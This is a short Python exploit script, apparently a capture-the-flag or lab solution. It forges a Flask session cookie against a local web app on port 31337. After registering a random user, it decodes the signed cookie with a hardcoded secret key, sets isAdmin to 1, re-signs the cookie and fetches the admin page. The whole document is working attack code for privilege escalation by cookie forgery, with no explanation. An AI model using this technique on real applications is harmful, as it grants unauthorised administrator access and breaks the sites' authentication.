#!/usr/bin/python3
from  requests import *
import sys
import random, string
from bs4 import BeautifulSoup
import time
import re
import base64
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

def randomword(length=10):
   return ''.join(random.choice(string.ascii_letters) for i in range(length))


#HOST = sys.argv[1]
SECRET_KEY = "i_love_crazy_cookies"
port = "31337"
#url = "http://"+HOST+port
url = "http://127.0.0.1:31337"
s = Session()
uname = randomword()
upass = randomword()
r = s.post(url+"/register", data={"uname": uname, "upass": upass})
flask_cookie = s.cookies.get('sessionID').encode()
flask_cookie = decodeFlaskCookie(SECRET_KEY, flask_cookie)
sessiondict = {
  u"id": dict(flask_cookie)['id'],
  u"isAdmin": 1,
  u"loggedIN": True,
  u"uname": uname,
  u"upass": upass}

s.cookies.clear()
cookie = encodeFlaskCookie(SECRET_KEY, sessiondict)
print(cookie)
print(decodeFlaskCookie(SECRET_KEY, cookie))
s.cookies["sessionID"] = cookie
r = s.get(url+"/astatistic")

